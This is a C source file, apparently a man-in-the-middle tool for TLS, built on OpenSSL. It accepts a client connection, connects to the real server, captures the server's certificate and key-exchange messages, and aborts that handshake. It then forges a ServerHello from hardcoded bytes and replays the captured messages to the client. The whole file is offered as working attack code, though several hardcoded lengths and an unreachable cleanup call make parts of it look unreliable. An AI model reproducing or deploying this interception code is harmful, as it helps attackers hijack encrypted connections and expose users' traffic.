#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// Initialize OpenSSL
void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// Cleanup OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Create SSL context for the MITM
SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_cipher_list(ctx, "DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256");

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1 | SSL_OP_NO_TLSv1_3);

    if (SSL_CTX_set1_curves_list(ctx, "secp384r1") != 1) {
        perror("Unable to set curves list");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

int server_sock;
int client_socket;
// Create a socket and connect to the server
int connect_to_server(const char *server_host, int server_port) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_host, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    server_sock = sock;
    return sock;
}


// Print hex data
void print_hex(const unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        printf("%02X ", data[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

// Message callback function to capture and print handshake messages
unsigned char server_key_exchange[4096];
unsigned char server_certificate[4096];
size_t server_key_exchange_len = 0;
size_t server_certificate_len = 0;



void message_callback(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg) {
    const unsigned char *p = buf;
    int msg_type = p[0];
    if (content_type == SSL3_RT_HANDSHAKE) {
        if (msg_type == SSL3_MT_SERVER_KEY_EXCHANGE) {
            memcpy(server_key_exchange, buf, len);
            server_key_exchange_len = len;
        } else if (msg_type == SSL3_MT_CERTIFICATE) {
            memcpy(server_certificate, buf, len);
            server_certificate_len = len;
        } else if (msg_type == SSL3_MT_SERVER_DONE) {
            close(server_sock);

        }
    }
}


// Intercept messages and establish a connection to the server
void intercept_and_relay(int client_sock, const char *server_host, int server_port) {
    unsigned char client_hello[4096];
    client_socket = client_sock;
    int bytes_read = read(client_sock, client_hello, sizeof(client_hello));
    if (bytes_read <= 0) {
        perror("Failed to read ClientHello");
        close(client_sock);
        exit(EXIT_FAILURE);
    }

    // Create MITM SSL context
    SSL_CTX *ctx = create_context();
    SSL_CTX_set_msg_callback(ctx, message_callback);  
    SSL *ssl;
    int server_sock = connect_to_server(server_host, server_port);   

    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, server_sock);

    // Initiate SSL handshake with the server
    if (SSL_connect(ssl) <= 0) {
        perror("Stop Connection with Server");
        close(server_sock);

        unsigned char prefix_sh[] = {0x16, 0x03, 0x03, 0x00, 0x39, 0x02, 0x00, 0x00, 0x35, 0x03, 0x03};
        unsigned char server_hello[4096];
        size_t server_hello_len = sizeof(prefix_sh) + 4 + 28 + 19;

        // Get GMT Unix time
        time_t current_time = time(NULL);
        unsigned char gmt_unix_time[4];
        gmt_unix_time[0] = (current_time >> 24) & 0xFF;
        gmt_unix_time[1] = (current_time >> 16) & 0xFF;
        gmt_unix_time[2] = (current_time >> 8) & 0xFF;
        gmt_unix_time[3] = current_time & 0xFF;

        // Append GMT Unix time to server_hello
        memcpy(server_hello, prefix_sh, sizeof(prefix_sh));
        memcpy(server_hello + sizeof(prefix_sh), gmt_unix_time, sizeof(gmt_unix_time));

        // Generate random bytes for the rest of the ServerHello random field
        unsigned char random_bytes[28];
        FILE *urandom = fopen("/dev/urandom", "r");
        if (!urandom) {
            perror("Failed to open /dev/urandom");
            exit(EXIT_FAILURE);
        }
        fread(random_bytes, 1, sizeof(random_bytes), urandom);
        fclose(urandom);

        // Append random bytes to server_hello
        memcpy(server_hello + sizeof(prefix_sh) + sizeof(gmt_unix_time), random_bytes, sizeof(random_bytes));

        unsigned char end[] = {0x00, 0x00, 0x9e, 0x00, 0x00, 0x0d, 0xff, 0x01, 0x00, 0x01, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00};
        memcpy(server_hello + sizeof(prefix_sh) + sizeof(gmt_unix_time) + sizeof(random_bytes), end, sizeof(end));

        unsigned char prefix[] = {0x16, 0x03, 0x03, 0x01, 0x6d};
        size_t prefix_len = sizeof(prefix);
        unsigned char modified_server_key_exchange[4096];
        size_t modified_server_key_exchange_len = 0;

        memcpy(modified_server_key_exchange, prefix, prefix_len);
        memcpy(modified_server_key_exchange + prefix_len, server_key_exchange, server_key_exchange_len);
        modified_server_key_exchange_len = prefix_len + server_key_exchange_len;

        unsigned char prefix2[] = {0x16, 0x03, 0x03, 0x02, 0xbd};
        size_t prefix2_len = sizeof(prefix2);
        unsigned char modified_server_certificate[4096];
        size_t modified_server_certificate_len = 0;
        memcpy(modified_server_certificate, prefix2, prefix2_len);
        memcpy(modified_server_certificate + prefix2_len, server_certificate, server_certificate_len);
        modified_server_certificate_len = prefix2_len + server_certificate_len;

        unsigned char server_hello_done[] = {0x16, 0x03, 0x03, 0x00, 0x4, 0x0e, 0x00, 0x00, 0x00};
        size_t server_hello_done_len = sizeof(server_hello_done);

        unsigned char all_data[4096];
        size_t all_data_len = 0;

        memcpy(all_data, server_hello, server_hello_len);
        all_data_len += server_hello_len;

        memcpy(all_data + all_data_len, modified_server_certificate, modified_server_certificate_len);
        all_data_len += modified_server_certificate_len;

        memcpy(all_data + all_data_len, modified_server_key_exchange, modified_server_key_exchange_len);
        all_data_len += modified_server_key_exchange_len;

        memcpy(all_data + all_data_len, server_hello_done, server_hello_done_len);
        all_data_len += server_hello_done_len;

        print_hex(all_data, all_data_len);
        write(client_sock, all_data, all_data_len);

        close(client_sock);
        exit(EXIT_FAILURE);
        SSL_free(ssl);
    }
}

int create_socket(const char *host, int port) {
    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Unable to bind");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (listen(sock, 1) < 0) {
        perror("Unable to listen");
        close(sock);
        exit(EXIT_FAILURE);
    }

    return sock;
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <host> <port> <server_port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);
    int server_port = atoi(argv[3]);

    initialize_openssl();

    int server_sock = create_socket(host, port);

    while (1) {
        struct sockaddr_in addr;
        socklen_t len = sizeof(addr);
        int client_sock = accept(server_sock, (struct sockaddr*)&addr, &len);
        if (client_sock < 0) {
            perror("Unable to accept");
            close(server_sock);
            cleanup_openssl();
            exit(EXIT_FAILURE);
        }

        intercept_and_relay(client_sock, host, server_port); 
    }

    close(server_sock);
    cleanup_openssl();

    return 0;
}
